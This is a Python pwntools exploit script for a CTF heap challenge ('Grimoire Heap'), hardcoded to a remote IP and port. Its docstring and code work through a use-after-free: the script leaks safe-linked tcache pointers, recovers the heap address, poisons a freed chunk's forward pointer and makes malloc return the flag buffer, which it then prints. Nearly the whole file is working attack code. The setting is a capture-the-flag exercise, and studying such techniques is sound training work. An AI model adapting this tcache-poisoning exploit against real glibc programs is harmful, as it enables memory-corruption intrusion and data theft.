#!/usr/bin/env python3
"""
Grimoire Heap - CTF exploit (tcache poisoning to read g_flag)

Bug: banish() frees the spell chunk but does NOT clear spells[i]/sizes[i]
     -> classic UAF (read after free = leak fd; write after free = poison fd).

Goal: g_flag (malloc(0x80) at startup, holds the flag) lives in the heap chunk
      immediately BEFORE the first spell chunk. Heap layout (fixed offsets):
          [tcache_perthread_struct 0x290]
          [g_flag chunk 0x90, user data @ heap+0x2a0 ]   <- target
          [spell0 chunk 0x90, user data @ heap+0x330 ]   <- C0
          [spell1 chunk 0x90, user data @ heap+0x3c0 ]   <- C1
      so target = C0 - 0x90.

libc has safe-linking (glibc 2.32+): PROTECT(pos,ptr) = (pos>>12) ^ ptr.
The "pos" for a tcache fd is the user-data address (fd lives at +0).

Plan (two distinct chunks -> count==2, no double-free):
  1. create(0,0x80) -> C0          (from top, consecutive)
  2. create(1,0x80) -> C1 = C0+0x90 (tcache empty, so both from top)
  3. banish(0)  -> count=1, head=C0, C0->fd = (C0>>12) ^ 0        = page
  4. banish(1)  -> count=2, head=C1, C1->fd = (C1>>12) ^ C0      = page ^ C0
  5. recite(0) -> fd0 = page
     recite(1) -> fd1 = page ^ C0   -> C0 = fd0 ^ fd1   (verify C0&0xfff==0x330)
  6. target  = C0 - 0x90
     protect = (C1>>12) ^ target = page ^ target = fd0 ^ target   (write to C1->fd)
  7. edit(1) -> write p64(protect) (pad to sizes[1]=0x80 bytes)
  8. create(0,0x80,"X\\n") -> pops C1 (head); new head = decode(C1->fd) = target; count=1
  9. create(2,0x80,"\\n")   -> pops g_flag (target); send only newline so flag bytes survive; count=0
 10. recite(2,0x80)         -> writes g_flag (the flag) + newline.

No code execution needed -> Full RELRO / PIE / canary / NX are irrelevant.
"""
from pwn import *
import sys, re

context.clear(arch='amd64')
context.log_level = 'warn'

HOST, PORT = '52.76.96.108', 9005
SZ = 0x80

def conn():
    return remote(HOST, PORT)

def menu(p):
    return p.recvuntil(b'> ')

def create(p, idx, size, data):
    p.sendline(b'1');            p.recvuntil(b'index: ')
    p.sendline(str(idx).encode()); p.recvuntil(b'size: ')
    p.sendline(str(size).encode()); p.recvuntil(b'data: ')
    if isinstance(data, str): data = data.encode()
    p.send(data)

def edit(p, idx, data):
    p.sendline(b'2');            p.recvuntil(b'index: ')
    p.sendline(str(idx).encode()); p.recvuntil(b'data: ')
    if isinstance(data, str): data = data.encode()
    assert len(data) == SZ, f"edit payload must be exactly {SZ} bytes, got {len(data)}"
    p.send(data)

def banish(p, idx):
    p.sendline(b'3');            p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())

def recite(p, idx, size):
    p.sendline(b'4');            p.recvuntil(b'index: ')
    p.sendline(str(idx).encode()); p.recvuntil(b'data: ')
    data = p.recvn(size)          # exactly `size` bytes
    # trailing newline separator
    try: p.recv(1, timeout=1)
    except: pass
    return data

def run():
    p = conn()
    banner = menu(p)
    log.warn("connected, banner len=%d" % len(banner))

    # 1+2. two consecutive chunks from the top
    create(p, 0, SZ, b'A' * (SZ-1) + b'\n')   # C0 (heap+0x330)
    create(p, 1, SZ, b'B' * (SZ-1) + b'\n')   # C1 (heap+0x3c0) = C0+0x90

    # 3+4. banish both -> tcache 0x90 bin: head=C1 -> C0, count=2
    banish(p, 0)
    banish(p, 1)

    # 5. UAF read the protected fd of each freed chunk
    d0 = recite(p, 0, SZ)
    d1 = recite(p, 1, SZ)
    fd0 = u64(d0[0:8])   # page  = C0>>12
    fd1 = u64(d1[0:8])   # page ^ C0
    page = fd0
    C0   = fd0 ^ fd1
    log.warn(f"fd0(page) = {hex(fd0)}")
    log.warn(f"fd1       = {hex(fd1)}")
    log.warn(f"C0        = {hex(C0)}  (low12 = {hex(C0 & 0xfff)})")

    if (C0 & 0xfff) != 0x330:
        log.warn("WARNING: expected C0 & 0xfff == 0x330 — heap layout assumption may be off!")

    # 6. g_flag user-data address and the protected fd to write into C1
    target  = C0 - 0x90                       # g_flag buf (heap+0x2a0)
    protect = page ^ target                   # (C1>>12) ^ target ; C1>>12 == page
    log.warn(f"target(g_flag buf) = {hex(target)}")
    log.warn(f"protect (C1->fd)   = {hex(protect)}")

    # 7. UAF write into freed C1: poison its fd to point at g_flag buf
    payload = p64(protect) + b'\x00' * (SZ - 8)
    edit(p, 1, payload)

    # 8. pop C1 (head) — new head becomes decode(C1->fd) = target
    create(p, 0, SZ, b'X\n')                  # spells[0] = C1 ; count=1 ; head=target

    # 9. pop g_flag — send ONLY a newline so the create loop stores nothing,
    #    preserving the flag bytes already sitting in the g_flag buffer.
    create(p, 2, SZ, b'\n')                    # spells[2] = g_flag buf ; count=0

    # 10. recite the spell that now points at g_flag -> dump the flag
    flag_data = recite(p, 2, SZ)
    print("\n=== recite(2) raw (hex) ===")
    print(flag_data.hex())
    print("\n=== recite(2) ascii ===")
    print(repr(flag_data))
    text = flag_data.split(b'\x00', 1)[0]      # flag is null-terminated in-buf
    print("\n=== candidate flag ===")
    print(text.decode(errors='replace'))

    # also scan the whole buffer for a {...} style flag just in case
    m = re.findall(rb'[ -~]{3,}', flag_data)
    if m:
        print("\n=== printable runs in buffer ===")
        for run in m:
            print(" ", run)
    try:
        p.sendline(b'0'); p.recvall(timeout=2)
    except: pass
    p.close()
    return text

if __name__ == '__main__':
    flag = run()
    print("\n\nFLAG:", flag.decode(errors='replace'))